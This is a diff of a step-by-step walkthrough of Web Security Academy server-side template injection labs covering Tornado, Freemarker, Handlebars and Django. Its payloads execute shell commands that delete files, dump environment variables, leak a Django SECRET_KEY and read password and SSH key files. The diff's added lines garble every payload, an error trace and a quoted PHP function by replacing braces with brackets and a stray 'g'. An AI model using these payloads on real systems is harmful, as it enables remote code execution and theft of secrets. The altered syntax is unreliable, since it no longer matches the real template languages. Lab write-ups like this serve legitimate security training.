@@ -106,8 +106,7 @@ blog-post-author-display=user.name&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
 
 To
 
-(No spaces on brackets. Adjusting for Jekyll.)
-blog-post-author-display=user.name}}{   {7*7    }}&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
+blog-post-author-display=user.name]]g[[7*7]]&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
 
 Go to:
 
@@ -116,18 +115,16 @@ https://0a3d00c1040fc12dc0c79efe00d00074.web-security-academy.net/post?postId=2
 Refresh the page
 Acknowledge that the username is now:
 
-Peter Wiener49}}
+Peter Wiener49]]g
 
 Go to: Repeater
 Change
 
-(No spaces on brackets. Adjusting for Jekyll.)
-blog-post-author-display=user.name   }}{{    7*7   }}&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
+blog-post-author-display=user.name]]g[[7*7]]&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
 
 To
 
-(No spaces on brackets. Adjusting for Jekyll.)
-blog-post-author-display=user.name   }}{    {who+am+i   }}&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
+blog-post-author-display=user.name]]g[[who+am+i]]&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
 
 Go to:
 
@@ -145,15 +142,15 @@ https://www.tornadoweb.org/en/stable/template.html
 
 Change:
 
-blog-post-author-display=user.name   }}{   {who+am+i   }}&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
+blog-post-author-display=user.name]]g[[who+am+i]]&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
 
 To
 
-#blog-post-author-display=user.name   }}{   %25+import+os+%25   }{{   os.system('rm+/home/carlos/morale.txt')&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
+#blog-post-author-display=user.name]]g[%25+import+os+%25][[os.system('rm+/home/carlos/morale.txt')&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
 
 // or // decoded
 
-blog-post-author-display=user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
+blog-post-author-display=user.name]]g[% import os %][[os.system('rm /home/carlos/morale.txt')&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
 
 Go to:
 
@@ -188,7 +185,7 @@ Click "View post"
 Click "Edit template"
 Input:
 
-{{   7*7   }}
+[[7*7]]g
 
 Go to: HTTP history
 Find:
@@ -216,9 +213,9 @@ Add '49'
 Start attack
 Note the '49' response for payload:
 
-${7*7}
-#{7*7}
-#{ 7 * 7 }
+$[7*7]
+#[7*7]
+#[ 7 * 7 ]
 
 Go to:
 
@@ -226,7 +223,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20
 
 Ctrl+f:
 
-${7*7}
+$[7*7]
 
 Java - Basic injection
 Go to:
@@ -235,7 +232,7 @@ https://0a4000120354754fc00e04710074005a.web-security-academy.net/product/templa
 
 Input:
 
-${class.getResource("").getPath()}
+$[class.getResource("").getPath()]
 
 Preview
 Response:
@@ -247,7 +244,7 @@ Go to:
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker
 Freemarker - Code execution:
 
-${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
+$["freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")]
 
 ```
 
@@ -299,19 +296,19 @@ Add '49'
 Start attack
 Note the '49' response for payload:
 (There are numerous responses)
-I found it easier to just append {{7*7}} to:
+I found it easier to just append [[7*7]]g to:
 
 https://0a6f002e041ae688c0bf164a0093002e.web-security-academy.net/?message=
 
 Like so:
 
-https://0a6f002e041ae688c0bf164a0093002e.web-security-academy.net/?message={{7*7}}
+https://0a6f002e041ae688c0bf164a0093002e.web-security-academy.net/?message=[[7*7]]g
 
 Response:
 
 Internal Server Error
 
-/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267 throw new Error(str); ^ Error: Parse error on line 1: {{7*7}} --^ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID' at Parser.parseError (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19) at Parser.parse (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30) at HandlebarsEnvironment.parse (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43) at compileInput (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19) at ret (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18) at [eval]:5:13 at Script.runInThisContext (vm.js:122:20) at Object.runInThisContext (vm.js:329:38) at Object.<anonymous> ([eval]-wrapper:6:22) at Module._compile (internal/modules/cjs/loader.js:778:30)
+/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267 throw new Error(str); ^ Error: Parse error on line 1: [[7*7]]g --^ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID' at Parser.parseError (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19) at Parser.parse (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30) at HandlebarsEnvironment.parse (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43) at compileInput (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19) at ret (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18) at [eval]:5:13 at Script.runInThisContext (vm.js:122:20) at Object.runInThisContext (vm.js:329:38) at Object.<anonymous> ([eval]-wrapper:6:22) at Module._compile (internal/modules/cjs/loader.js:778:30)
 
 Google:
 
@@ -327,59 +324,59 @@ Find:
 
 https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html
 
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return JSON.stringify(process.env);"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
+[[#with "s" as |string|]]g
+  [[#with "e"]]g
+    [[#with split as |conslist|]]g
+      [[this.pop]]g
+      [[this.push (lookup string.sub "constructor")]]g
+      [[this.pop]]g
+      [[#with string.split as |codelist|]]g
+        [[this.pop]]g
+        [[this.push "return JSON.stringify(process.env);"]]g
+        [[this.pop]]g
+        [[#each conslist]]g
+          [[#with (string.sub.apply 0 codelist)]]g
+            [[this]]g
+          [[/with]]g
+        [[/each]]g
+      [[/with]]g
+    [[/with]]g
+  [[/with]]g
+[[/with]]g
 
 Change to:
 
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
+[[#with "s" as |string|]]g
+  [[#with "e"]]g
+    [[#with split as |conslist|]]g
+      [[this.pop]]g
+      [[this.push (lookup string.sub "constructor")]]g
+      [[this.pop]]g
+      [[#with string.split as |codelist|]]g
+        [[this.pop]]g
+        [[this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"]]g
+        [[this.pop]]g
+        [[#each conslist]]g
+          [[#with (string.sub.apply 0 codelist)]]g
+            [[this]]g
+          [[/with]]g
+        [[/each]]g
+      [[/with]]g
+    [[/with]]g
+  [[/with]]g
+[[/with]]g
 
 To
 
-{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+[[#with "s" as |string|]]g[[#with "e"]][[#with split as |conslist|]][[this.pop]][[this.push (lookup string.sub "constructor")]][[this.pop]][[#with string.split as |codelist|]][[this.pop]][[this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"]][[this.pop]][[#each conslist]][[#with (string.sub.apply 0 codelist)]][[this]][[/with]][[/each]][[/with]][[/with]][[/with]][[/with]]
 
 To (URL-encoded version)
 
-{{%23with+"s"+as+|string|}}{{%23with+"e"}}{{%23with+split+as+|conslist|}}{{this.pop}}{{this.push+(lookup+string.sub+"constructor")}}{{this.pop}}{{%23with+string.split+as+|codelist|}}{{this.pop}}{{this.push+"return+require('child_process').exec('rm+/home/carlos/morale.txt')%3b"}}{{this.pop}}{{%23each+conslist}}{{%23with+(string.sub.apply+0+codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+[[%23with+"s"+as+|string|]]g[[%23with+"e"]][[%23with+split+as+|conslist|]][[this.pop]][[this.push+(lookup+string.sub+"constructor")]][[this.pop]][[%23with+string.split+as+|codelist|]][[this.pop]][[this.push+"return+require('child_process').exec('rm+/home/carlos/morale.txt')%3b"]][[this.pop]][[%23each+conslist]][[%23with+(string.sub.apply+0+codelist)]][[this]][[/with]][[/each]][[/with]][[/with]][[/with]][[/with]]
 
 Go to: Repeater
 
-GET /?message={{%23with+"s"+as+|string|}}{{%23with+"e"}}{{%23with+split+as+|conslist|}}{{this.pop}}{{this.push+(lookup+string.sub+"constructor")}}{{this.pop}}{{%23with+string.split+as+|codelist|}}{{this.pop}}{{this.push+"return+require('child_process').exec('rm+/home/carlos/morale.txt')%3b"}}{{this.pop}}{{%23each+conslist}}{{%23with+(string.sub.apply+0+codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}} HTTP/1.
+GET /?message=[[%23with+"s"+as+|string|]]g[[%23with+"e"]][[%23with+split+as+|conslist|]][[this.pop]][[this.push+(lookup+string.sub+"constructor")]][[this.pop]][[%23with+string.split+as+|codelist|]][[this.pop]][[this.push+"return+require('child_process').exec('rm+/home/carlos/morale.txt')%3b"]][[this.pop]][[%23each+conslist]][[%23with+(string.sub.apply+0+codelist)]][[this]][[/with]][[/each]][[/with]][[/with]][[/with]][[/with]] HTTP/1.
 
 Send
 
@@ -407,7 +404,7 @@ Send
 Login as content-manager:C0nt3ntM4n4g3r
 Go to: "View details"
 Click "Edit template"
-Input {{7*7}}
+Input [[7*7]]g
 Preview
 Output:
 
@@ -423,12 +420,12 @@ https://github.com/Lifars/davdts
 
 Input:
 
-{% debug %}
+[% debug %]
 
 Review
 Input:
 
-{{settings.SECRET_KEY}}
+[[settings.SECRET_KEY]]g
 
 Output:
 
@@ -457,7 +454,7 @@ Click "View post"
 Click "Edit template"
 Input:
 
-{{7*7}}
+[[7*7]]g
 
 Go to: HTTP history
 Find:
@@ -485,9 +482,9 @@ Add '49'
 Start attack
 Note the '49' response for payload:
 
-${7*7}
-#{7*7}
-#{ 7 * 7 }
+$[7*7]
+#[7*7]
+#[ 7 * 7 ]
 
 Go to:
 
@@ -495,7 +492,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20
 
 Ctrl+f:
 
-${7*7}
+$[7*7]
 
 Go to:
 
@@ -503,7 +500,7 @@ https://0a8100a2036f7f77c0bc1b8a002d005d.web-security-academy.net/product/templa
 
 Input:
 
-${class.getResource("").getPath()}
+$[class.getResource("").getPath()]
 
 Preview
 Response:
@@ -516,11 +513,11 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20
 
 Change:
 
-${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
+$[product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")]
 
 To
 
-${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+$[product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")]
 
 Preview
 Response:
@@ -582,7 +579,7 @@ blog-post-author-display=user.name&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
 
 To
 
-blog-post-author-display=user.name}}{{7*7}}&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
+blog-post-author-display=user.name]]g[[7*7]]&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
 
 Go to:
 
@@ -591,7 +588,7 @@ https://0a5d00a803cc5fa5c0c323d000350024.web-security-academy.net/post?postId=10
 Refresh the page
 Acknowledge that the username is now:
 
-H0td0g49}}
+H0td0g49]]g
 
 Go to: "My account"
 Add an avatar
@@ -607,7 +604,7 @@ Response:
 PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application/x-desktop in /home/carlos/User.php:28
 Stack trace:
 #0 /home/carlos/avatar_upload.php(19): User->setAvatar()
-#1 {main}
+#1 [main]
   thrown in /home/carlos/User.php on line 28
 
 Go to: Repeater
@@ -688,11 +685,11 @@ GET /avatar?avatar=wiener HTTP/1.1
 Send
 Response:
 
-    public function gdprDelete() {
+    public function gdprDelete() [
         $this->rm(readlink($this->avatarLink));
         $this->rm($this->avatarLink);
         $this->delete();
-    }
+    ]
 
 Point user.setAvatar to the '/home/carlos/.ssh/id_rsa' file then call gdprDelete() function
 
